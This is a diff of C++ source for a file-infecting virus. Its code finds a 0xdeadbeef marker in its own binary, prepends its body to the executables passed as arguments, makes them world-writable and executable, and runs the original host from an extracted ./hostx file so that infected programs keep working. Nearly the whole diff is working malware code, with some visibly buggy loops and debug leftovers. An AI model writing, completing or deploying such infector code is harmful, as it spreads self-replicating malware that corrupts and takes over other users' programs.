@@ -9,173 +9,184 @@
 #include <cstdio>
 
 const u_int32_t SENTVAL = 0xdeadbeef;
-std::streampos globalPos;
 
 using namespace std;
 
-// void infect(int argc, char *argv[], int fd_r){
-//     int fd_t;
-//     int target, i;
-//     int done, bytes, length;
-//     void *map;
-//     struct stat stat;
-//     char buf[BUFSIZ];
-
-
-//     if (argc < 2){
-//         return;
-//     }
-//     for(target = 1; target<argc; target++){
-//         if(!access(argv[target], W_OK | X_OK)){
-//             goto NAILED;
-//         }
-//     }
-//     return;
-//     NAILED:
-//     fstat(fd_t, &stat);
-//     length = stat.st_size;
-
-//     map = (char *)malloc(length);
-//     if (!map){
-//         goto OUT;
-//     }
-//     for( i = 0; i < length; i++){
-//         read(fd_t, map + i, 1);
-//     }
-//     lseek(fd_t, 0 , SEEK_SET);
-//     if (ftruncate(fd_t, 0)){
-//         goto OUT;
-//     }
-//     done = 0;
-//     lseek(fd_r, 0, SEEK_SET);
-//     while(done < V_OFFSET){
-//         bytes = read(fd_r, buf, 1);
-//         write(fd_t, buf, bytes);
-//         done+=bytes;
-//     }
-//     OUT:
-//         close(fd_t);
-//         return;
-// }
-
-//doing some ridiculous shit because apparently you cant run tmpfile() because it gets stored in memory
-void execFiles(FILE* f1, const string& f2){
-    char tmpFile[] = "/tmp/hostXXX";
+bool infect(string& virusPath, string& infectedPath, string& victimPath){
     
-    //making temp file
-    int f = mkstemp(tmpFile);
-    if (f == -1){
-        cerr <<"cant make file"<<"\n";
-        return;
+    FILE* virusFile;
+    FILE* infectedFile;
+    FILE* victimFile;
+    
+    virusFile = fopen(virusPath.c_str(), "r");
+    if(!virusFile){
+        cerr<<"cannot open virusFile";
+        return false;
+    }
+    infectedFile = fopen(infectedPath.c_str(), "w");
+    victimFile = fopen(victimPath.c_str(), "r");
+
+    u_int8_t byteC = 0;
+    u_int8_t markerFound = 0;
+
+    //looking for marker
+    while(fread(&byteC, 1, 1, virusFile) == 1 && markerFound < 4){
+        switch(markerFound){
+            case 0:
+                if(byteC == 0xde){ markerFound++;}
+                break;
+            case 1:
+                if(byteC == 0xad){markerFound++;}
+                else{markerFound=0;}
+                break;
+            case 2:
+                if(byteC == 0xbe){markerFound++;}
+                else{markerFound=0;}
+                break;
+            case 3:
+                if(byteC == 0xef){markerFound++;}
+                else{markerFound=0;}
+                break;
+            default:
+                break;
+        }
+        fwrite(&byteC, 1, 1, infectedFile);
     }
 
-    FILE* frun = fdopen(f, "wb");
-    
-    //making sure that the memory pointer is in the right spot
-    rewind(f1);
+    u_int64_t debug = 0;
 
-    char buffer[BUFSIZ];
-    size_t b;
-    //while file has stuff left to read, read it into new file
-    int debugfread = fread(buffer, 1, sizeof(buffer), f1);
-    cout<<fread;
-    while ((b = fread(buffer, 1, sizeof(buffer), f1)) > 0){
-        fwrite(buffer, 1, b, frun);
-    }
-    fclose(frun);
-    chmod(tmpFile, 0777);
-    string runstring = "."+string(tmpFile) + " " + f2;
-    system(runstring.c_str());
-    return;
-
-}
-
-void findSentVal(const string& file, streampos& pos){
-    //open file
-    ifstream f(file, std::ios::binary);
-
-    //create buffer
-    char buffer[BUFSIZ];
-    //read file into buffer and check for marker
-    while(f.read(buffer, BUFSIZ) || f.gcount() > 0){
-        size_t bytes1 = f.gcount();
-        for (size_t i = 0; i < bytes1 - sizeof(SENTVAL)+1; i++){
-            pos=f.tellg() - bytes1 + i;
-            // globalPos = pos;
+    while(fread(&byteC, 1, 1, virusFile)==1){
+        debug = fread(&byteC, 1, 1, victimFile);
+        if(debug != 1 && debug != 0){
+            cout<<"bad fread\n";
+            cout<<debug<<"\n";
+            break;
+        }
+        debug = fwrite(&byteC, 1, 1, infectedFile);
+        if(debug != 1 && debug != 0){
+            cout<<"bad fread\n";
+            cout<<debug<<"\n";
+            break;
         }
     }
-    return;
+    chmod(victimPath.c_str(), 0777);
+    chmod(infectedPath.c_str(), 0777);
+    chmod(virusPath.c_str(), 0777);
+    fclose(victimFile);
+    fclose(virusFile);
+    fclose(infectedFile);
+
+    return true;
 }
+
+
+
 
 //takes the file after the 0xdeadbeef and makes a temporary file from it
-//returns string of file path to temporary file
-FILE* makeTmp (const string& fs, streampos pos){
+//returns true if file is created
+bool makeTmp (const string& f1, const string& f2){
     //creating tmp file
-    char tmpFile[] = "/tmp/hostXXXXX";
-    int f = mkstemp(tmpFile);
-    if (f == -1){
-        cerr<<"shits fucked cant make file(makeTmp)\n";
-        return nullptr;
+    FILE* rfile;
+    FILE* hostx;
+    rfile = fopen(f1.c_str(), "rb");
+    if(!rfile){
+        cerr<<"could not open file "<<f1<<"\n";
+        return false;
     }
-
-    FILE* tmp = fdopen(f, "wb");
-    if(!tmp){
-        cerr<<"segfault found fucko\n";
+    hostx = fopen(f2.c_str(), "wb");
+    if(!hostx){
+        cerr<<"could not create temp file "<<f2<<"\n";
     }
-    //opening file and moving to position after marker
-    ifstream file(fs, std::ios::binary);
-    file.seekg(pos+sizeof(SENTVAL));
-
-    //taking everything from after SENTVAL and putting it into the tmp file
-    char buffer[BUFSIZ];
-    while(file.read(buffer, sizeof(buffer))){
-        fwrite(buffer, 1, file.gcount(), tmp);
+    chmod(f1.c_str(), 0777);
+    chmod(f2.c_str(), 0777);
+    u_int8_t bc = 0;
+    size_t br;
+    bool found = false;
+    u_int8_t marker = 0;
+    u_int64_t debug = 0;
+    while((br = fread(&bc, 1, 1, rfile))==1){
+        //printf("Read byte: 0x%02x\n", bc);
+        if(!found){
+            switch(marker){
+                case 0:
+                    if(bc == 0xde){ marker++;}
+                    break;
+                case 1:
+                    if(bc == 0xad){marker++;}
+                    else{marker=0;}
+                    break;
+                case 2:
+                    if(bc == 0xbe){marker++;}
+                    else{marker=0;}
+                    break;
+                case 3:
+                    cout<<marker<<"\n";
+                    if(bc == 0xef){marker++; found = true;fread(&bc, 1, 1, rfile); break;}
+                    else{marker=0;}
+                    break;
+            }
+        }
+        if(found){
+            // while(1){
+            //     debug = fread(&bc, 1, 1, rfile);
+            //     //cout<<debug<<"\n";
+            //     if (debug != 1){
+            //         printf("bad read in makeTMP\n");
+            //         exit(0);
+            //     }
+            //     if(bc == 0x7F){
+            //         break;
+            //     }
+            // }
+            //printf("writing byte: 0x%02x\n", bc);
+            if (fwrite(&bc, 1, 1, hostx) != 1) {
+                cerr << "Error writing to " << f2 << "\n";
+                fclose(rfile);
+                fclose(hostx);
+                return false;
+            }
+        }        
     }
-    //get rest of data into tmp
-    if (file.gcount() > 0 ){
-        fwrite(buffer, 1, file.gcount(), tmp);
+    if(!found){
+        cerr<<"deadbeef not found in "<<f1<<"\n";
+        fclose(rfile);
+        fclose(hostx);
+        return false;
     }
-    rewind(tmp);
-    return tmp;
+    fclose(rfile);
+    fclose(hostx);
+    chmod(f2.c_str(), 0777);
+    //cout <<"host file created at: "<<f2<<"\n";
+    return true;
 }
 
-void prepend(string& f1, string& f2){
-    ifstream i1(f1, std::ios::binary);
-    
-    //open f2, prepend f1, add 0xdeadbeef marker
-    ofstream out(f2, std::ios::binary);
-    out << i1.rdbuf();
-    out.write(reinterpret_cast<const char*>(SENTVAL), sizeof(SENTVAL));
-    
-    //open f2 to write append original contents after the marker
-    ifstream i2(f2, std::ios::binary);
-    out << i2.rdbuf();
-    
-    return;
-}
 
 
 int main (int argc, char *argv[]){
-    string runningFile = argv[0];
-    string f2 = argv[1];
-    //get position of 0xdeadbeef
-    //prepend(runningFile, f2);
-    streampos pos;
-    findSentVal(runningFile, pos);
-
-    //debug
-    cout << "0xdeadbeef at " << pos <<"\n";    
-
-    //make file from content aftet 0xdeadbeef
-    FILE* tmp1 = makeTmp(runningFile, pos);
-
-    if(!tmp1){
-        cerr << "shits fucked\n";
+    string hostP = "./hostx";
+    if(!makeTmp(argv[0], hostP)){
+        cerr<<"could not make file\n";
+        exit(0);
+    }
+    for(int i = 1; i < argc; i++){
+        string tmpFileName = "./tmp";
+        chmod(argv[i], 0777);
+        rename(argv[i], tmpFileName.c_str());
+        string s1(argv[0]);
+        string s2(argv[i]);
+        //cout<<s1<<"\n";
+        //cout<<s2<<"\n";
+        chmod(tmpFileName.c_str(), 0777);
+        infect(s1, s2, tmpFileName);
+        chmod(argv[i], 0777);
+        chmod(tmpFileName.c_str(), 0777);
+        //execl(tmpFileName.c_str(), hostP.c_str());
+        //remove(tmpFileName.c_str());
+    }
+    chmod(hostP.c_str(), 0777);
+    
+    if(execv(hostP.c_str(), argv)==-1){
+        cerr<<"cant execute program";
         return 1;
     }
-    execFiles(tmp1, f2);
-    return 0;
-    
-
-
 }
